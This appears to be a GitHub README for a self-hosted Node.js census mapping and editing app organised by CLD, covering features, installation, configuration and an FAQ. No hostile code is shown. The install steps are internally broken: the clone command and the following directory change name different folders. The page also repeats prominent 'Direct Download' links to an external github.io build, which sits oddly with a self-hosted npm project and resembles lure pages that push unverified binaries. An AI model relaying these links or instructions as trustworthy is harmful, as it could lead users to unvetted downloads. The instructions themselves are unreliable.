# Census Map Editor v2026 - web application 2026

> **A self-hosted Node.js web app for census mapping and editing, built for CLD-based workflows, mobile uploads, and GeoJSON-backed updates in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-self--hosted%20Node.js%20web%20app-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/cedrichuber31/censusmap-win-21591?style=flat-square)](https://github.com/cedrichuber31/censusmap-win-21591)

---

<p align="center">
  <a href="https://cedrichuber31.github.io/censusmap-win-21591/">
    <img src="https://img.shields.io/badge/Download-Census%20Map%20Editor%20Latest-brightgreen?style=for-the-badge" alt="Download Census Map Editor">
  </a>
</p>

> **[Direct Download - Census Map Editor v2026](https://cedrichuber31.github.io/censusmap-win-21591/)**

---

[Download Latest Build](https://cedrichuber31.github.io/censusmap-win-21591/)

---

## About Census Map Editor

Census Map Editor is a self-hosted web application designed to support census mapping workflows with a region-first CLD navigation model. It combines map viewing and editing in one interface, helping teams move from a regional record to CU, block, and dwelling-level updates without switching tools.

The application is built around file-based storage and GeoJSON-oriented map data, making it practical for environments that need direct control over their data layout. It is especially useful when editing needs to work across desktop and mobile devices, including iPhone-based field updates and photo uploads from the field.

---

## Features

- Region-first navigation organized by CLD
- Separate routes for read-only viewing and edit mode
- Per-CLD storage for CU, block, and dwelling records
- Geometry editing for CU and block boundaries
- Dwelling add, update, and delete actions
- Server-side handling for compressed photo uploads
- Mobile-friendly editing with iPhone compatibility
- Basic-auth protection for edit endpoints

---

## Installation

Clone the repository and install it on a Node.js-capable server:

```bash
git clone https://github.com/cedrichuber31/censusmap-win-21591.git
cd censusmap-cld-map-editor
npm install
```

After setup, start the app with your project-specific Node.js launch command or service configuration. If you are deploying from a local build, make sure the file storage directory is writable before opening the editor.

---

## Usage

Open the viewer to browse census areas by CLD, then switch into edit mode when you need to update map geometry or dwelling records.

Typical workflow:

1. Load a CLD in the viewer.
2. Review CU, block, and dwelling data stored for that region.
3. Open the edit route to modify boundaries or dwelling details.
4. Upload compressed photos from a desktop or mobile device.
5. Save changes back to the per-CLD file structure.

If your deployment uses authentication, sign in before accessing edit endpoints.

---

## Configuration

This project is centered on file-based storage, so the main settings usually live in your deployment files, environment variables, or Node.js app configuration.

Example structure:

```json
{
  "storage": "./data",
  "auth": {
    "enabled": true
  },
  "uploads": {
    "compressedPhotos": true
  }
}
```

Common values to review include the storage path, auth settings for edit routes, and any upload-related options used by your server.

---

## Requirements

- Node.js runtime
- A writable filesystem for per-CLD data storage
- Access to GeoJSON-capable map data
- A browser for viewing and editing
- Optional mobile device support for field uploads and editing
- Basic authentication if edit endpoints are protected in your deployment

---

## FAQ

**How does the editor organize data?**  
It uses CLD-based grouping with separate storage for CU, block, and dwelling information.

**Can I use it on mobile devices?**  
Yes. The editing workflow is designed to work on mobile devices, including iPhone-compatible interactions.

**Where are uploads stored?**  
Uploads are handled server-side and stored according to your configured file-based storage layout.

**Why are there separate view and edit routes?**  
The application separates read-only viewing from editing so deployments can control access to changes more precisely.

**What should I check if editing is unavailable?**  
Confirm that basic-auth credentials are correct, the edit route is enabled, and the server can write to the storage directory.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
